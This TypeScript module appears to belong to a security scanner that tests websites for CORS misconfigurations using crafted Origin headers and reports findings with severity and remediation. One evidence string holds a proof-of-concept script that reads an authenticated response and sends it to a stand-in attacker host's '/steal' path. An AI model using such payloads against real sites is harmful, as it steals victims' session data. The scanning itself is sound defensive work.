/**
 * CORS — Comprehensive Cross-Origin Resource Sharing misconfiguration testing.
 *
 * Techniques:
 *   1. Origin reflection (wildcard reflection with credentials)
 *   2. Null origin
 *   3. Pre-domain bypass: evil.com → evilTARGET.com
 *   4. Post-domain bypass: TARGET.com.evil.com (subdomain confusion)
 *   5. HTTP downgrade bypass
 *   6. Special-character origin bypass: TARGET.com%60evil.com
 *   7. Trusted subdomain chain (any subdomain → full CORS)
 *   8. Open CORS on API endpoints and sensitive paths
 */

import { ts } from '../context';
import { probe } from '../utils/http';
import type { RealFinding, LogFn, Target } from '../context';

const ATTACKER_DOMAIN = 'attacker-sentinelx.com';
const SENSITIVE_PATHS = [
  '/',
  '/api/',
  '/api/v1/',
  '/api/v2/',
  '/graphql',
  '/auth/',
  '/user',
  '/account',
  '/admin/',
  '/internal/',
];

interface CorsResult {
  origin: string;
  acao: string;
  acac: string;
  reflectsOrigin: boolean;
  allowsCredentials: boolean;
}

async function checkCors(
  url: string,
  origin: string,
  method = 'GET',
): Promise<CorsResult | null> {
  const response = await probe(url, {
    method,
    headers: { Origin: origin },
    timeoutMs: 8_000,
  });
  if (!response) return null;

  const acao = response.headers['access-control-allow-origin'] ?? '';
  const acac = response.headers['access-control-allow-credentials'] ?? '';

  return {
    origin,
    acao,
    acac,
    reflectsOrigin: acao === origin || acao === '*',
    allowsCredentials: acac.toLowerCase() === 'true',
  };
}

export async function checkCorsMisconfiguration(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const host = target.hostname;
  const base = target.url.replace(/\/$/, '');

  await onLog(`[${ts()}] [CORS] Testing ${host} for CORS misconfigurations...`);

  // Build the list of bypass origin probes
  const bypassOrigins: Array<{ label: string; origin: string; criticalIfCredentials: boolean }> = [
    {
      label: 'arbitrary origin reflection',
      origin: `https://${ATTACKER_DOMAIN}`,
      criticalIfCredentials: true,
    },
    {
      label: 'null origin',
      origin: 'null',
      criticalIfCredentials: true,
    },
    {
      label: 'HTTP downgrade (https→http with credentials)',
      origin: `http://${host}`,
      criticalIfCredentials: false,
    },
    {
      label: 'pre-domain confusion (evilTARGET.com)',
      origin: `https://${ATTACKER_DOMAIN.replace('.com', '')}${host}`,
      criticalIfCredentials: true,
    },
    {
      label: 'post-domain confusion (TARGET.attacker.com)',
      origin: `https://${host}.${ATTACKER_DOMAIN}`,
      criticalIfCredentials: true,
    },
    {
      label: 'special-character bypass (backtick)',
      origin: `https://${host}\`${ATTACKER_DOMAIN}`,
      criticalIfCredentials: true,
    },
    {
      label: 'wildcard subdomain (any.TARGET.com)',
      origin: `https://any-subdomain.${host}`,
      criticalIfCredentials: false,
    },
    {
      label: 'XSS-chained trusted subdomain',
      origin: `https://xss-subdomain.${host}`,
      criticalIfCredentials: true,
    },
  ];

  // Test against multiple endpoints
  const endpointsToTest = SENSITIVE_PATHS.slice(0, 5).map((p) => `${base}${p}`);

  for (const endpoint of endpointsToTest) {
    const corsResults = await Promise.allSettled(
      bypassOrigins.map((b) => checkCors(endpoint, b.origin)),
    );

    for (let i = 0; i < corsResults.length; i++) {
      const result = corsResults[i]!;
      if (result.status !== 'fulfilled' || !result.value) continue;

      const cors = result.value;
      const bypass = bypassOrigins[i]!;

      if (!cors.reflectsOrigin) continue;

      // Wildcard without credentials: low severity
      if (cors.acao === '*' && !cors.allowsCredentials) {
        // Only report if on sensitive endpoint
        if (endpoint.includes('/api/') || endpoint.includes('/auth/') || endpoint.includes('/admin/')) {
          findings.push({
            title: `Permissive CORS: Wildcard Origin on Sensitive Endpoint`,
            severity: 'medium',
            verified: true,
            verification: 'verified',
            confidence: 88,
            evidenceQuality: 'standard',
            verificationMethod: 'Direct Origin header probe — ACAO: *',
            reproducibility: 'reproducible',
            affectedEndpoint: endpoint,
            cvss: 5.4,
            cve: null,
            description: `The endpoint returns Access-Control-Allow-Origin: * which allows any origin to read the response. On a sensitive endpoint this may leak data.`,
            evidence: `Endpoint  : ${endpoint}\nOrigin    : ${bypass.origin}\nACCO      : ${cors.acao}\nACCC      : ${cors.acac || '(none)'}`,
            remediation: 'Restrict CORS to an explicit allowlist of trusted origins. Do not use wildcard on authenticated endpoints.',
            compliance: { owasp: ['A01', 'A05'], pci: ['6.2.4'], nist: ['AC-3'] },
          });
        }
        continue;
      }

      // Origin reflected with credentials: critical
      if (cors.reflectsOrigin && cors.allowsCredentials) {
        const severity = bypass.criticalIfCredentials ? 'critical' : 'high';
        const cvss = bypass.criticalIfCredentials ? 9.3 : 8.1;

        findings.push({
          title: `CORS Misconfiguration — ${bypass.label} with Credentials`,
          severity,
          verified: true,
          verification: 'verified',
          confidence: 96,
          evidenceQuality: 'strong',
          verificationMethod: 'Origin reflection confirmed: ACAO reflects attacker origin + ACAC: true.',
          reproducibility: 'reproducible',
          affectedEndpoint: endpoint,
          cvss,
          cve: null,
          description: `The endpoint accepts cross-origin requests from "${bypass.origin}" and includes Access-Control-Allow-Credentials: true. An attacker can host a page that silently reads authenticated responses — session data, CSRF tokens, private information — from any victim who visits the attacker page.`,
          evidence: [
            `Endpoint  : ${endpoint}`,
            `Bypass    : ${bypass.label}`,
            `Origin    : ${bypass.origin}`,
            `ACAO      : ${cors.acao}`,
            `ACAC      : ${cors.acac}`,
            `Attack    : <script>fetch('${endpoint}',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://${ATTACKER_DOMAIN}/steal?d='+btoa(d)))</script>`,
          ].join('\n'),
          remediation: `Restrict Access-Control-Allow-Origin to an explicit allowlist. Never combine a reflected/wildcard origin with Access-Control-Allow-Credentials: true. Implement CSRF tokens for state-changing operations.`,
          compliance: { owasp: ['A01', 'A05'], pci: ['6.2.4', '6.2.3'], nist: ['AC-3', 'SC-8'] },
        });

        await onLog(`[${ts()}] [CORS] ⚠ Critical CORS bypass: ${bypass.label} at ${endpoint}`);
        break; // One finding per endpoint is enough
      }

      // Origin reflected without credentials: medium
      if (cors.reflectsOrigin && !cors.allowsCredentials && cors.acao !== '*') {
        findings.push({
          title: `CORS Misconfiguration — Origin Reflected (No Credentials)`,
          severity: 'medium',
          verified: true,
          verification: 'verified',
          confidence: 80,
          evidenceQuality: 'standard',
          verificationMethod: 'ACAO reflects arbitrary origin without credentials.',
          reproducibility: 'reproducible',
          affectedEndpoint: endpoint,
          cvss: 5.4,
          cve: null,
          description: `The endpoint reflects the Origin header in Access-Control-Allow-Origin without validating it against an allowlist. While credentials are not shared, unauthenticated/public data can be read cross-origin.`,
          evidence: `Endpoint  : ${endpoint}\nBypass    : ${bypass.label}\nOrigin    : ${bypass.origin}\nACCO      : ${cors.acao}\nACCC      : ${cors.acac || '(none)'}`,
          remediation: 'Validate the Origin against an explicit allowlist. Do not blindly reflect the Origin header.',
          compliance: { owasp: ['A05'], pci: ['6.2.4'], nist: ['AC-3'] },
        });
      }
    }
  }

  // Test preflight
  const preflightCheck = await checkCors(
    `${base}/api/`,
    `https://${ATTACKER_DOMAIN}`,
    'OPTIONS',
  );
  if (
    preflightCheck?.reflectsOrigin &&
    preflightCheck.allowsCredentials &&
    !findings.some((f) => f.affectedEndpoint?.includes('/api/'))
  ) {
    findings.push({
      title: 'CORS Preflight Allows Arbitrary Origin with Credentials',
      severity: 'high',
      verified: true,
      verification: 'verified',
      confidence: 88,
      evidenceQuality: 'standard',
      verificationMethod: 'OPTIONS preflight returns ACAO reflecting attacker origin with ACAC: true.',
      reproducibility: 'reproducible',
      affectedEndpoint: `${base}/api/`,
      cvss: 8.1,
      cve: null,
      description: 'CORS preflight permits cross-origin requests from arbitrary origins with credentials.',
      evidence: `OPTIONS ${base}/api/ with Origin: https://${ATTACKER_DOMAIN}\nACCO: ${preflightCheck.acao}\nACCC: ${preflightCheck.acac}`,
      remediation: 'Restrict allowed origins in CORS preflight responses. Validate Origin header server-side.',
      compliance: { owasp: ['A01'], pci: ['6.2.4'], nist: ['AC-3'] },
    });
  }

  await onLog(`[${ts()}] [CORS] Complete — ${findings.length} misconfiguration(s) found`);
  return findings;
}
